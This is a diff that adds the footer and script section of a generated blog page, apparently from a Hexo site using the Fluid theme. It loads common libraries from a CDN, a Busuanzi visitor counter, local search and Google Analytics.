+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-WTRCMZDFLE', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-WTRCMZDFLE"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-WTRCMZDFLE');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
